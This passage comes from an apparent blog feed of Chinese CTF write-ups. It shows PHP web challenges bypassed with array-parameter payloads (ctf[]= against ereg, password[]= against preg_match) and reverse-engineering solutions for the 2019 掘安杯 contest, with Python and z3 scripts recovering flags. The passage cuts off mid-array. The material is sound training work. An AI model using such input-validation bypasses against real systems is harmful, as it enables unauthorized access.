class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'ctf'</span>])) &#123;<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'ctf'</span>]) === <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">'必须输入数字才行'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'ctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'骚年，继续努力吧啊~'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/15.php?ctf[]=</code></p><h3 id="数字验证正则绕过">数字验证正则绕过<a class="post-anchor" href="#数字验证正则绕过"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-string">"POST"</span> == $_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>])&#123;$password = $_POST[<span class="hljs-string">'password'</span>];<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="hljs-comment">//preg_match — 执行一个正则表达式匹配</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'flag'</span>;<span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">while</span> (<span class="hljs-keyword">TRUE</span>)&#123;$reg = <span class="hljs-string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<span class="hljs-keyword">break</span>;$c = <span class="hljs-number">0</span>;$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)&#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))$c += <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span><span class="hljs-keyword">if</span> (<span class="hljs-string">"42"</span> == $password) <span class="hljs-keyword">echo</span> $flag;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'Wrong password'</span>;<span class="hljs-keyword">exit</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>利用preg_match()函数不能处理数组进行构造payload<br>payload<code>post : password[]=</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019掘安杯-write up</title>
      <link href="/2019/04/10/2019%E6%8E%98%E5%AE%89%E6%9D%AF-write-up/"/>
      <url>/2019/04/10/2019%E6%8E%98%E5%AE%89%E6%9D%AF-write-up/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h1><h2 id="baby-reverse">baby_reverse<a class="post-anchor" href="#baby-reverse"></a></h2><p>加密函数如下</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">encode</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1, __int64 a2)</span></span>&#123;  <span class="hljs-keyword">char</span> v3[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-50h]</span>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-30h]</span>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+74h] [rbp-Ch]</span>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+7Ch] [rbp-4h]</span>  v7 = <span class="hljs-number">18</span>;  i = <span class="hljs-number">0</span>;  v6 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(a1) != <span class="hljs-number">18</span> )    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Your Length is Wrong"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"flag&#123;This_1s_f4cker_flag&#125;"</span>);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v7; i += <span class="hljs-number">3</span> )  &#123;    v5[i] = v7 ^ (a1[i] + <span class="hljs-number">6</span>);    v4[i + <span class="hljs-number">1</span>] = (a1[i + <span class="hljs-number">1</span>] - <span class="hljs-number">6</span>) ^ v7;    v3[i + <span class="hljs-number">2</span>] = a1[i + <span class="hljs-number">2</span>] ^ <span class="hljs-number">6</span> ^ v7;    *(_BYTE *)(a2 + i) = v5[i];    *(_BYTE *)(a2 + i + <span class="hljs-number">1L</span>L) = v4[i + <span class="hljs-number">1</span>];    *(_BYTE *)(a2 + i + <span class="hljs-number">2L</span>L) = v3[i + <span class="hljs-number">2</span>];  &#125;  <span class="hljs-keyword">return</span> a2;&#125;</code></pre><p>很简单得加密函数<br>一共分为三组</p><pre><code class="hljs python">key = <span class="hljs-string">'bIwhroo8cwqgwrxusi'</span>flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">18</span>,<span class="hljs-number">3</span>):  flag += chr((ord(key[i])^<span class="hljs-number">18</span>) - <span class="hljs-number">6</span>) + chr((ord(key[i+<span class="hljs-number">1</span>])^<span class="hljs-number">18</span>) + <span class="hljs-number">6</span>) + chr(ord(key[i+<span class="hljs-number">2</span>])^<span class="hljs-number">6</span>^<span class="hljs-number">18</span>)<span class="hljs-keyword">print</span> flag<span class="hljs-comment">#jactf&#123;w0w_is_flag&#125;</span></code></pre><h2 id="Replace">Replace<a class="post-anchor" href="#Replace"></a></h2><p>加密函数如下</p><pre><code class="hljs cpp">v2 = a1;  <span class="hljs-keyword">if</span> ( a2 != <span class="hljs-number">35</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  v4 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    v5 = *(_BYTE *)(v4 + v2);    v6 = (v5 &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>;    v7 = (<span class="hljs-number">16</span> * v5 &gt;&gt; <span class="hljs-number">4</span>) % <span class="hljs-number">16</span>;    v8 = byte_402150[<span class="hljs-number">2</span> * v4];    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">48</span> || v8 &gt; <span class="hljs-number">57</span> )      v9 = v8 - <span class="hljs-number">87</span>;    <span class="hljs-keyword">else</span>      v9 = v8 - <span class="hljs-number">48</span>;    v10 = byte_402151[<span class="hljs-number">2</span> * v4];    v11 = <span class="hljs-number">16</span> * v9;    <span class="hljs-keyword">if</span> ( v10 &lt; <span class="hljs-number">48</span> || v10 &gt; <span class="hljs-number">57</span> )      v12 = v10 - <span class="hljs-number">87</span>;    <span class="hljs-keyword">else</span>      v12 = v10 - <span class="hljs-number">48</span>;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)byte_4021A0[<span class="hljs-number">16</span> * v6 + v7] != ((v11 + v12) ^ <span class="hljs-number">0x19</span>) )      <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">if</span> ( ++v4 &gt;= <span class="hljs-number">35</span> )      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</code></pre><p>这是爆破的思路</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> stringbyte_402150 = [<span class="hljs-number">0x32</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>,<span class="hljs-number">0x31</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>,<span class="hljs-number">0x61</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>]byte_4021A0 = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>,  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>,  <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>,  <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>,  <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>,  <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>,  <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>,  <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,  <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>,  <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>,  <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>,  <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>,  <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>,  <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>,  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>,  <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,  <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>,  <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>,  <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>,  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>,  <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>,  <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>,  <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>,  <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>,  <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>,  <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>]flag=<span class="hljs-string">''</span>v4=<span class="hljs-number">0</span>dic=string.ascii_lowercase+string.ascii_uppercase+string.digits+<span class="hljs-string">'&#123;&#125;_!%^&amp;'</span><span class="hljs-keyword">while</span>(v4&lt;<span class="hljs-number">35</span>):  v8 = byte_402150[<span class="hljs-number">2</span>*v4]  <span class="hljs-keyword">if</span> (v8 &lt; <span class="hljs-number">48</span> <span class="hljs-keyword">or</span> v8 &gt; <span class="hljs-number">57</span>):    v9 = v8 - <span class="hljs-number">87</span>  <span class="hljs-keyword">else</span>:    v9 = v8 <span class="hljs-number">-48</span>  v10 = byte_402150[<span class="hljs-number">2</span>*v4+<span class="hljs-number">1</span>]  v11 = <span class="hljs-number">16</span> * v9  <span class="hljs-keyword">if</span>(v10 &lt; <span class="hljs-number">48</span> <span class="hljs-keyword">or</span> v10 &gt;<span class="hljs-number">57</span>):    v12 = v10 <span class="hljs-number">-87</span>  <span class="hljs-keyword">else</span>:    v12 = v10 <span class="hljs-number">-48</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:    v6 = (ord(i)&gt;&gt;<span class="hljs-number">4</span>)%<span class="hljs-number">16</span>    v7 = (<span class="hljs-number">16</span>*ord(i)&gt;&gt;<span class="hljs-number">4</span>)%<span class="hljs-number">16</span>    <span class="hljs-keyword">if</span>(byte_4021A0[<span class="hljs-number">16</span>*v6 + v7]==(v11+v12)^<span class="hljs-number">0x19</span>):      flag += i      <span class="hljs-keyword">break</span>  v4 += <span class="hljs-number">1</span><span class="hljs-keyword">print</span> flag<span class="hljs-comment">#flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span></code></pre><p>贴一下<a href="https://seanachao.github.io/2018/11/29/%E6%B9%96%E6%B9%98%E6%9D%AFre%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">大佬</a>用z3解的脚本</p><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8 -*-</span><span class="hljs-comment">#flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span>list_flag = [<span class="hljs-number">51</span>, <span class="hljs-number">80</span>, <span class="hljs-number">239</span>, <span class="hljs-number">133</span>, <span class="hljs-number">33</span>, <span class="hljs-number">32</span>, <span class="hljs-number">69</span>, <span class="hljs-number">199</span>, <span class="hljs-number">143</span>, <span class="hljs-number">207</span>, <span class="hljs-number">199</span>, <span class="hljs-number">143</span>, <span class="hljs-number">207</span>, <span class="hljs-number">237</span>, <span class="hljs-number">249</span>, <span class="hljs-number">60</span>, <span class="hljs-number">81</span>, <span class="hljs-number">80</span>, <span class="hljs-number">77</span>, <span class="hljs-number">207</span>, <span class="hljs-number">0</span>, <span class="hljs-number">77</span>, <span class="hljs-number">81</span>, <span class="hljs-number">199</span>, <span class="hljs-number">239</span>, <span class="hljs-number">251</span>, <span class="hljs-number">195</span>, <span class="hljs-number">207</span>, <span class="hljs-number">110</span>, <span class="hljs-number">159</span>, <span class="hljs-number">251</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">195</span>, <span class="hljs-number">255</span>]byte_4021A0 = [<span class="hljs-number">99</span>, <span class="hljs-number">124</span>, <span class="hljs-number">119</span>, <span class="hljs-number">123</span>, <span class="hljs-number">242</span>, <span class="hljs-number">107</span>, <span class="hljs-number">111</span>, <span class="hljs-number">197</span>, <span class="hljs-number">48</span>, <span class="hljs-number">1</span>, <span class="hljs-number">103</span>, <span class="hljs-number">43</span>, <span class="hljs-number">254</span>, <span class="hljs-number">215</span>, <span class="hljs-number">171</span>, <span class="hljs-number">118</span>, <span class="hljs-number">202</span>, <span class="hljs-number">130</span>, <span class="hljs-number">201</span>, <span class="hljs-number">125</span>, <span class="hljs-number">250</span>, <span class="hljs-number">89</span>, <span class="hljs-number">71</span>, <span class="hljs-number">240</span>, <span class="hljs-number">173</span>, <span class="hljs-number">212</span>, <span class="hljs-number">162</span>, <span class="hljs-number">175</span>, <span class="hljs-number">156</span>, <span class="hljs-number">164</span>, <span class="hljs-number">114</span>, <span class="hljs-number">192</span>, <span class="hljs-number">183</span>, <span class="hljs-number">253</span>, <span class="hljs-number">147</span>, <span class="hljs-number">38</span>, <span class="hljs-number">54</span>, <span class="hljs-number">63</span>, <span class="hljs-number">247</span>, <span class="hljs-number">204</span>, <span class="hljs-number">52</span>, <span class="hljs-number">165</span>, <span class="hljs-number">229</span>, <span class="hljs-number">241</span>, <span class="hljs-number">113</span>, <span class="hljs-number">216</span>, <span class="hljs-number">49</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">199</span>, <span class="hljs-number">35</span>, <span class="hljs-number">195</span>, <span class="hljs-number">24</span>, <span class="hljs-number">150</span>, <span class="hljs-number">5</span>, <span class="hljs-number">154</span>, <span class="hljs-number">7</span>, <span class="hljs-number">18</span>, <span class="hljs-number">128</span>, <span class="hljs-number">226</span>, <span class="hljs-number">235</span>, <span class="hljs-number">39</span>, <span class="hljs-number">178</span>, <span class="hljs-number">117</span>, <span class="hljs-number">9</span>, <span class="hljs-number">131</span>, <span class="hljs-number">44</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">110</span>, <span class="hljs-number">90</span>, <span class="hljs-number">160</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">214</span>, <span class="hljs-number">179</span>, <span class="hljs-number">41</span>, <span class="hljs-number">227</span>, <span class="hljs-number">47</span>, <span class="hljs-number">132</span>, <span class="hljs-number">83</span>, <span class="hljs-number">209</span>, <span class="hljs-number">0</span>, <span class="hljs-number">237</span>, <span class="hljs-number">32</span>, <span class="hljs-number">252</span>, <span class="hljs-number">177</span>, <span class="hljs-number">91</span>, <span class="hljs-number">106</span>, <span class="hljs-number">203</span>, <span class="hljs-number">190</span>, <span class="hljs-number">57</span>, <span class="hljs-number">74</span>, <span class="hljs-number">76</span>, <span class="hljs-number">88</span>, <span class="hljs-number">207</span>, <span class="hljs-number">208</span>, <span class="hljs-number">239</span>, <span class="hljs-number">170</span>, <span class="hljs-number">251</span>, <span class="hljs-number">67</span>, <span class="hljs-number">77</span>, <span class="hljs-number">51</span>, <span class="hljs-number">133</span>, <span class="hljs-number">69</span>, <span class="hljs-number">249</span>, <span class="hljs-number">2</span>, <span class="hljs-number">127</span>, <span class="hljs-number">80</span>, <span class="hljs-number">60</span>, <span class="hljs-number">159</span>, <span class="hljs-number">168</span>, <span class="hljs-number">81</span>, <span class="hljs-number">163</span>, <span class="hljs-number">64</span>, <span class="hljs-number">143</span>, <span class="hljs-number">146</span>, <span class="hljs-number">157</span>, <span class="hljs-number">56</span>, <span class="hljs-number">245</span>, <span class="hljs-number">188</span>, <span class="hljs-number">182</span>, <span class="hljs-number">218</span>, <span class="hljs-number">33</span>, <span class="hljs-number">16</span>, <span class="hljs-number">255</span>, <span class="hljs-number">243</span>, <span class="hljs-number">210</span>, <span class="hljs-number">205</span>, <span class="hljs-number">12</span>, <span class="hljs-number">19</span>, <span class="hljs-number">236</span>, <span class="hljs-number">95</span>, <span class="hljs-number">151</span>, <span class="hljs-number">68</span>, <span class="hljs-number">23</span>, <span class="hljs-number">196</span>, <span class="hljs-number">167</span>, <span class="hljs-number">126</span>, <span class="hljs-number">61</span>, <span class="hljs-number">100</span>, <span class="hljs-number">93</span>, <span class="hljs-number">25</span>, <span class="hljs-number">115</span>, <span class="hljs-number">96</span>, <span class="hljs-number">129</span>, <span class="hljs-number">79</span>, <span class="hljs-number">220</span>, <span class="hljs-number">34</span>, <span class="hljs-number">42</span>, <span class="hljs-number">144</span>, <span class="hljs-number">136</span>, <span class="hljs-number">70</span>, <span class="hljs-number">238</span>, <span class="hljs-number">184</span>, <span class="hljs-number">20</span>, <span class="hljs-number">222</span>, <span class="hljs-number">94</span>, <span class="hljs-number">11</span>, <span class="hljs-number">219</span>, <span class="hljs-number">224</span>, <span class="hljs-number">50</span>, <span class="hljs-number">58</span>, <span class="hljs-number">10</span>, <span class="hljs-number">73</span>, <span class="hljs-number">6</span>, <span class="hljs-number">36</span>, <span class="hljs-number">92</span>, <span class="hljs-number">194</span>, <span class="hljs-number">211</span>, <span class="hljs-number">172</span>, <span class="hljs-number">98</span>, <span class="hljs-number">145</span>, <span class="hljs-number">149</span>, <span class="hljs-number">228</span>, <span class="hljs-number">121</span>, <span class="hljs-number">231</span>, <span class="hljs-number">200</span>, <span class="hljs-number">55</span>, <span class="hljs-number">109</span>, <span class="hljs-number">141</span>, <span class="hljs-number">213</span>, <span class="hljs-number">78</span>, <span class="hljs-number">169</span>, <span class="hljs-number">108</span>, <span class="hljs-number">86</span>, <span class="hljs-number">244</span>, <span class="hljs-number">234</span>, <span class="hljs-number">101</span>, <span class="hljs-number">122</span>, <span class="hljs-number">174</span>, <span class="hljs-number">8</span>, <span class="hljs-number">186</span>, <span class="hljs-number">120</span>, <span class="hljs-number">37</span>, <span class="hljs-number">46</span>, <span class="hljs-number">28</span>, <span class="hljs-number">166</span>, <span class="hljs-number">180</span>, <span class="hljs-number">198</span>, <span class="hljs-number">232</span>, <span class="hljs-number">221</span>, <span class="hljs-number">116</span>, <span class="hljs-number">31</span>, <span class="hljs-number">75</span>, <span class="hljs-number">189</span>, <span class="hljs-number">139</span>, <span class="hljs-number">138</span>, <span class="hljs-number">112</span>, <span class="hljs-number">62</span>, <span class="hljs-number">181</span>, <span class="hljs-number">102</span>, <span class="hljs-number">72</span>, <span class="hljs-number">3</span>, <span class="hljs-number">246</span>, <span class="hljs-number">14</span>, <span class="hljs-number">97</span>, <span 